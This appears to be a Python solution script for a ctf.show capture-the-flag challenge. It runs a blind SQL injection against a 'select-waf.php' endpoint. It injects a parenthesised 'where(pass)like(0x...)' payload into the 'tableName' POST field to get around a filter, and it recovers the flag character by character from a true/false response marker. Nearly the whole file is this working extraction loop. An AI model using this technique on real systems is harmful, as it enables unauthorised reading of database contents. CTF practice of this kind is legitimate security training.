import string

import requests

url = "http://5f890ae9-1057-43e2-bdcd-7169bb09ae82.challenge.ctf.show/select-waf.php"
payload = "(ctfshow_user)where(pass)like(0x{})"
true_flag = "$user_count = 1;"


def make_payload(has: str) -> str:
    return payload.format((has + "%").encode().hex())


def valid_payload(p: str) -> bool:
    data = {
        "tableName": p
    }
    response = requests.post(url, data=data)
    return true_flag in response.text


flag = "ctf" # 这里注意表中用 like 'ctf%' 只有一个结果，要提前给出这一小段 flag 头避免其他记录干扰匹配
while True:
    for c in "{}-" + string.digits + string.ascii_lowercase:
        pd = flag+c
        print(f"\r[*] trying {pd}", end="")
        if valid_payload(make_payload(pd)):
            flag += c
            print(f"\r[*] flag: {flag}")
            break
    if flag[-1] == "}":
        break
